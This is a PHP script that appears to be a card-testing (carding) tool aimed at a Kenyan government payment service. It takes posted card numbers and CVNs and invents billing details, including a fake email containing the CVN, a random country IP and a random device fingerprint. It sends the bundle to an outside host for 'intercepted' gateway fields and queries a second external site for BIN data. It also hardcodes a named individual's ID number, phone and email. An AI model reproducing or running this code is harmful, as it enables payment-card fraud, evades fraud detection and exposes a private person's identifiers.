<?php
include './includes/functions.php';

header('Content-Type: application/json');

$data = $_POST;

$data['anchor'] = 'amountExpected=650.00&apiClientID=1&billDesc=OFFICIAL%20SEARCH%20(%22CR12%22)&billRefNumber=X8VJM3&callBackURLOnFail=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2FX8VJM3%2Fcallback%2Ffailed&callBackURLOnSuccess=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2FX8VJM3%2Fcallback%2Fsuccess&clientEmail=bombardier.devs.master%40gmail.com&clientIDNumber=4917833&clientMSISDN=%2B254756754595&clientName=GODFREY%20GITAU%20NGURE&currency=KES&notificationURL=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fapi%2Fpayments%2Fpesaflow-ipn&secureHash=ODAwNTBjZjQzMWE4NzZmMjNhZDE4M2E1OTJiMzFjNGZmMzU2YTUwN2ZlOTFiMDVkMmEyMmMzOTliMDcwNzkxYQ%3D%3D&serviceID=42&clientType=1';

$data['CardNo4'] = formatCardNumberByTypeCode($data['card_number']);
$data['bill_to_address_state'] = formatStateCode($data['bill_to_address_state']);
$data['name'] = $data['first_name'] . ' ' . $data['last_name'];
$data['card_number'] = str_replace(' ', '', $data['CardNo4']);
$data['card_type'] = getCardTypeCode($data['card_number']);
$data['card_expiry_date'] = $data['eMonth'] . '-' . $data['eYear'];
$data['bill_to_forename'] = $data['first_name'];
$data['bill_to_surname'] = $data['last_name'];
$data['bill_to_address_line2'] = generateE164Phone($data['bill_to_address_country']);
$data['bill_to_phone'] = $data['bill_to_address_line2'];
$data['bill_to_email'] = strtolower($data['first_name']) . strtolower($data['last_name']) . $data['card_cvn'] . '@gmail.com';
$data['customer_ip_address'] = getRandomIpForCountry($data['bill_to_address_country'], $ipRanges);
$data['device_fingerprint_id'] = generateRandomId();

$data = reorderArray($data, $targetOrder);

$json = json_encode($data);
$base64 = base64_encode($json);
$url = 'https://pesaflow.fly.dev/?obj=' . urlencode($base64);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

// If cURL failed
if ($error) {
    echo json_encode([
        'success' => false,
        'error' => "Curl error: $error",
        'raw_response' => $response
    ]);
    exit;
}

// Try decode
$parsed = json_decode($response, true);

// If not JSON, return raw content for debugging
if (json_last_error() !== JSON_ERROR_NONE || !isset($parsed['intercepted'][0]['fields'])) {
    echo json_encode([
        'success' => false,
        'error' => 'Full response is not valid JSON or expected format',
        'json_error' => json_last_error_msg(),
        'http_code' => $httpCode,
        'raw_response' => $base64,
        //'raw_response' => $json.' - '.$response,
        //'raw_response' => $response
        //'raw_response' => 'Error processing request!'
    ]);
    exit;
}

// Normal flow continues here if JSON is valid
$fields = $parsed['intercepted'][0]['fields'];
$_POST = $fields;
ob_start();
include 'cybersrc.php';
$interpreted = json_decode(ob_get_clean(), true);

// Get BIN info
$bin = substr(preg_replace('/\\D/', '', $data['card_number'] ?? ''), 0, 6);
$binData = [];
if ($bin) {
    $binUrl = 'https://payment.tsavo.site/get_bin.php?bin=' . urlencode($bin);
    $ch = curl_init($binUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $binResp = curl_exec($ch);
    if (!curl_error($ch)) {
        $binData = json_decode($binResp, true);
    }
    curl_close($ch);
}

echo json_encode([
    'success' => true,
    'cybersource_interpretation' => $interpreted,
    'bin_info' => $binData,
    'raw_fields' => $fields
]);
